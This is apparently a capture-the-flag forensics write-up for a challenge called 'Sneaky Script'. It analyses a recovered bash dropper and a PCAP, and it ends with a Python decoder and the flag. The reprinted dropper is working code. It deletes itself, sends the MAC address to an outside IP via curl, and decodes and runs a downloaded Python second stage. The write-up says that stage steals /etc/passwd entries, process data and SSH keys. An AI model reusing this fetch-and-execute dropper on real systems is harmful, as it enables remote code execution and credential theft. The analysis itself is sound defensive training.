# Sneaky Script

description:

"We recovered a malicious script from a victim environment. Can you figure out
what it did, and if any sensitive information was exfiltrated? We were able to
export some PCAP data from their environment as well."

files:
- pcap
- bash script

```sh
#!/bin/bash

rm -f "${BASH_SOURCE[0]}"

which python3 >/dev/null
if [[ $? -ne 0 ]]; then
    exit
fi

which curl >/dev/null
if [[ $? -ne 0 ]]; then
    exit
fi

mac_addr=$(ip addr | grep 'state UP' -A1 | tail -n1 | awk '{print $2}')

curl 54.80.43.46/images/banner.png?cache=$(base64 <<< $mac_addr) -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 2>/dev/null | base64 -d > /tmp/.cacheimg
python3 /tmp/.cacheimg
rm -f /tmp/.cacheimg
```

bash script:
- checks if the user has python and curl, gets the MAC addr, then curls a C2
server (which isn't up)
- the calling home to the C2 server downloads the second stage payload,
which is a python executable

pcap:
- looking at traffic statistics we can see some HTTP. applying a filter, we can
see a GET request to the malicious URL, a 200 OK form the server, and then a POST
request to the /upload endpoint and another 200 OK.
- from this we can assume the second stage python script exfiltrated data
- the GET request to the endpoint includes b64 encoded data
- if this is downloaded to `stage2_b64`, and decoded with `cat stage2_b64 | base64 -d > stage2`
and running `file stage2` reveals it is a python3.6 byte-compiled binary

stage2.pyc:
- use uncompyle6 to decode it to `stage2.py`
- this python script opens `/etc/passwd` and grabs all sans root
- it opens `/proc` and grabs PID executable and cmdline arguments
- opens `/.ssh` and grabs keys
- it then prepares all the data, does some custom encoding, then b64 encodes it
and sends it as a POST request

The POST request data in the wireshark dump is then the encoded exfiltrated data.
Decoding requires reversing how the `stage2.py` encoded it which is in the script below,
and using json prettifier to view it better.

the flag is ultimately in the JSON data `dam{oh_n0_a1l_muh_k3y5_are_g0n3}`


script to decode the b64 data in wireshark dump POST request:

```py
#!/usr/bin/env python3

import base64, json

def decode(data):
    k = b'8675309'

    d = base64.b64decode(data).decode("utf-8")
    d_dec = [ord(c) for c in d]
    decoded = [d_dec[i] ^ k[(i % len(k))] for i in range(len(d_dec))]
  
    decoded_chr = "".join([chr(c) for c in decoded])
    print(f"{decoded_chr=}")

if __name__ == "__main__":
    with open("exfiltrated") as f:
        decode(f.read())
```
